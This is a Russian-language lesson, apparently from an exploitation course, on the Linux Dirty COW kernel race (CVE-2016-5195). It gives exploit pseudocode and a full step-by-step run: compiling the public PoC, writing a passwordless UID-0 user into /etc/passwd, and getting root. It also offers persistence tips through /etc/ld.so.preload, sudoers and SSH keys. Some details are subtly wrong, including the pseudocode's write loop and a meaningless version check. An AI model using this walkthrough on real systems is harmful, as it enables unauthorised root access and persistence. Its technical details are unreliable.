## Вопрос, с которого всё начинается

Ты уже видел гонки в user-space. Но что если гонка живёт **внутри ядра**, в
механизме, который по определению должен защищать память? Именно такова
**Dirty COW** (CVE-2016-5195) — уязвимость ядра Linux, жившая 9 лет (с 2007 по
2016). Она позволяла любому пользователю записать данные в файл, доступный
**только для чтения**, и через это получить root.

## Наш пример

Цель — файл `/etc/passwd` (или `/etc/passwd`-совместимая запись в `/etc/passwd`).
Он доступен на чтение всем, но на запись — только root. Если мы сможем изменить
в нём строку пользователя, добавив себе root-UID, мы получим root.

Сначала смотрим версию ядра:

```
$ uname -r
4.4.0-31-generic
```

Ядра от `2.6.22` до `4.8.3` уязвимы. Проверить можно и практическим тестом
(публичный `dirtycow.c` от scumjr).

## Шаг 1: что такое copy-on-write

Когда два процесса отображают один и тот же файл в память через `mmap`,
ядро не копирует страницы: оба видят одни и те же физические страницы, помеченные
как доступные **только для чтения** (read-only). Это называется
**copy-on-write (COW)** — «копирование при записи».

Как только процесс пытается записать в такую страницу, происходит **страничный
сбой** (page fault). Ядро видит, что страница read-only, делает её приватную
копию, и дальше пишет в копию. Оригинал (и файл) не меняется.

Идея COW: «не тратить память на копии, пока никто не пишет».

## Шаг 2: где ломается

Баг — в функции `get_user_pages`, которая отдаёт страницу для записи. Есть
гонка между двумя операциями:

- ядро готовит приватную копию страницы (write fault);
- другой поток в этот же момент вызывает `madvise(MADV_DONTNEED)` — команду
  «забудь эту страницу, перечитай её из файла».

Если порядок неудачный, ядро записывает данные **в саму страницу файла**, а не
в приватную копию. То есть read-only страница становится writable. Это и есть
Dirty COW.

## Шаг 3: как превратить гонку в запись в файл

Эксплойт делает так:

1. Отображает `/etc/passwd` (read-only) через `mmap` в память.
2. Запускает поток, который бесконечно делает `madvise(MADV_DONTNEED)` по этой
   странице.
3. В другом потоке пишет в память новую строку пользователя.
4. Гонка срабатывает — запись попадает в файл.

Псевдокод (упрощённо, по мотивам `dirtycow.c`):

```c
// отображаем файл
void *map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
// поток-«молотилка» гонки
while (1) {
    madvise(map, st.st_size, MADV_DONTNEED);
    lseek(fd, offset, SEEK_SET);
    write(fd, ...);            // попытка записать через другой дескриптор
}
```

Реальный эксплойт аккуратно синхронизирует потоки и подбирает выравнивание по
страницам (4096 байт). При удачной гонке байты в файле действительно меняются.

## Шаг 4: добавляем root-пользователя

Строка в `/etc/passwd` выглядит так:

```
root:x:0:0:root:/root:/bin/bash
```

Поля через `:` — имя, пароль, UID, GID, комментарий, домашний каталог, shell.
Эксплойт перезаписывает комментарий у пользователя `root` на строку вида
`pwned::0:0:...`, создавая второго пользователя с UID 0 без пароля. После
успешной гонки:

```
$ su pwned
root#
```

Пароля нет (поле пароля пустое), UID 0 — значит полный root.

## Шаг 5: почему это «просто гонка», а не эксплойт памяти

Dirty COW не требует ни переполнения, ни утечки адресов. Нужно лишь выиграть
гонку. Поэтому эксплойт работает даже при включённых ASLR, NX и stack canary —
он вообще не трогает поток управления. Это пример **data-only** атаки: мы меняем
данные, а не код.

Минус — надёжность. Гонка может занять от секунд до минут и сильно грузит CPU
(ядерный эксплойт запускает много потоков). На боевой цели это заметно и может
уронить систему.

## Шаг 6: исправление и проверка

Патч (октябрь 2016) исправил `get_user_pages`, убрав окно гонки в обработке
`MADV_DONTNEED` для COW-страниц. Проверить, уязвима ли цель:

```
$ grep -q Dirty /proc/version && echo old || true
$ uname -r
4.4.0-31-generic   # уязвимо
```

Обновление ядра до версии выше `4.8.3` (или патченной сборки дистрибутива)
закрывает дыру.

## Шаг 7: почему гонку удаётся выиграть

Гонка — это когда результат зависит от того, какой поток успел первым. Здесь
два потока выполняют взаимоисключающие операции:

- поток A просит ядро «перечитать страницу из файла» (`MADV_DONTNEED`);
- поток B в этот момент пишет в ту же страницу.

Обычно ядро сериализует эти действия, и запись уходит в приватную копию. Но окно
между проверкой «страница приватная?» и её созданием не закрыто. Если B попадёт
точно в это окно, запись уйдёт в страницу, привязанную к файлу. Чем больше
потоков и чем чаще повтор, тем выше шанс. Поэтому эксплойт крутит цикл миллионы
раз — за секунды-минуты окно обязательно ловится.

## Шаг 8: как это выглядит на практике

Публичный эксплойт печатает прогресс:

```
$ ./dirtycow /etc/passwd "$(cat newpasswd)"
mmap 0x7f2c1c000000
madvise 0x7f2c1c000000
procselfmem 0x...
madvise 0x7f2c1c000000
...
/etc/passwd successfully patched
```

Строка `procselfmem` — это трюк: эксплойт пишет не через `mmap`-указатель, а через
`/proc/self/mem`, чтобы попасть в нужную страницу. После успеха проверяем:

```
$ head -1 /etc/passwd
pwned::0:0:root:/root:/bin/bash
$ su pwned
root#
```

## Шаг 9: где ещё применима техника

Dirty COW — не только про `/etc/passwd`. Той же записью в read-only память можно:

- подменить исполняемый файл, который потом запустит root (например, cron-скрипт);
- изменить `/etc/ld.so.preload`, добавив свою библиотеку (это уже персистентность);
- перезаписать содержимое бинарника, лежащего в read-only разделе.

Отсюда и класс задач: **любой read-only файл, доступный на чтение, становится
доступным на запись**, пока ядро уязвимо. Это делает Dirty COW универсальным
инструментом повышения привилегий и персистентности.

## Шаг 10: грабли и ограничения

- **Продолжительность.** Гонка может занять минуты; таймауты в скриптах это ломают.
- **Нагрузка.** Много потоков сильно греют CPU и заметны в мониторинге.
- **Файловые системы.** На некоторых ФС (например, с шифрованием) страницы могут
  вести себя иначе, и техника не срабатывает.
- **Ядро > 4.8.3.** Патч закрывает окно — эксплойт бесполезен.

## Полный прогон от начала до конца

**Шаг 0. Разведка.**

```
$ id
uid=1001(user) gid=1001(user) groups=1001(user)
$ uname -r
4.4.0-31-generic
```

Ядро `4.4` уязвимо (диапазон `2.6.22`–`4.8.3`).

**Шаг 1. Проверка без эксплуатации.** Смотрим, что запись в `/etc/passwd` нам
запрещена:

```
$ echo x >> /etc/passwd
bash: /etc/passwd: Permission denied
```

**Шаг 2. Подготовка строки.** Формируем нового пользователя с UID 0:

```
$ cat > /tmp/new <<'EOF'
pwned::0:0:root:/root:/bin/bash
EOF
```

**Шаг 3. Запуск эксплойта.** Собираем публичный PoC и запускаем:

```
$ gcc -pthread dirtycow.c -o dirtycow -lcrypt
$ ./dirtycow /etc/passwd "$(cat /tmp/new)"
mmap 0x7f8e2c000000
madvise 0x7f8e2c000000
...
/etc/passwd successfully patched
```

**Шаг 4. Проверка.** Читаем файл обратно — убеждаемся, что строка появилась:

```
$ head -1 /etc/passwd
pwned::0:0:root:/root:/bin/bash
$ su pwned
root#
```

**Шаг 5. Закрепление.** Получив root, можно добавить себя в `/etc/sudoers` или
положить SSH-ключ — но это уже персистентность, отдельный этап.

## Что если не сработало

| Симптом | Причина | Что делать |
|---|---|---|
| `patched` не появляется | гонка не выиграна | запустить снова / больше потоков |
| файл не меняется | патченное ядро | проверить `uname -r` |
| падает с `Killed` | OOM от потоков | уменьшить число потоков |
| `/etc/passwd` не изменился | ФС/шифрование | попробовать другой файл |

Dirty COW — вероятностная атака. То, что с первого раза не сработало, не значит,
что вектор мёртв: гонка может занять минуты. Но если ядро патчено — вектор
закрыт навсегда.

## Родственные техники и варианты

Dirty COW породил целое семейство похожих багов в управлении памятью ядра:

- **Dirty Pipe** (CVE-2022-0847) — перезапись read-only файлов через
  неинициализированные флаги pipe-буфера; проще и надёжнее COW.
- **DirtyCred** (CVE-2022-2588) — подмена привилегированных объектов ядра
  (например, `struct cred`) через use-after-free.
- **Dirty Pagetable** — перезапись страничных таблиц для контроля физической
  памяти.

Все они — **data-only**: не трогают поток управления, поэтому не боятся ASLR и
NX. Изучив Dirty COW, ты понимаешь общий шаблон: найти гонку/UAF в управлении
памятью и превратить её в запись туда, куда нельзя.

| Что | Значение |
|---|---|
| CVE | CVE-2016-5195 |
| Тип | race condition в COW |
| Уязвимые ядра | 2.6.22–4.8.3 |
| Примитив | запись в read-only файл |
| Цель | `/etc/passwd` (или `/etc/ld.so.preload`) |
| Фикс | ядро > 4.8.3 |

## Что мы теперь знаем

- COW экономит память, отображая один файл на несколько процессов.
- Страничный сбой создаёт приватную копию при первой записи.
- Dirty COW — гонка с `MADV_DONTNEED`, из-за которой запись идёт в файл.
- Эксплуатация — data-only: меняем `/etc/passwd`, получаем UID 0.
- Не требует обхода ASLR/NX, но нестабильна и шумна.

## Куда дальше

Мы увидели гонку в ядре, меняющую read-only файлы. В следующем уроке разберём
**Looney Tunables** — переполнение буфера в загрузчике glibc через переменную
`GLIBC_TUNABLES`, которая тоже ведёт к root, но уже через контроль над
загружаемыми библиотеками. А пока запомни: **гонка + COW = запись в файл, который
должен быть только для чтения**.

## Где пригодится

- Повышение привилегий на старых Linux-ядрах (Android, встраиваемые системы).
- Понимание страничных сбоев и COW — база для kernel-эксплуатации.
- Иллюстрация data-only атак, которые не боятся ASLR/NX.
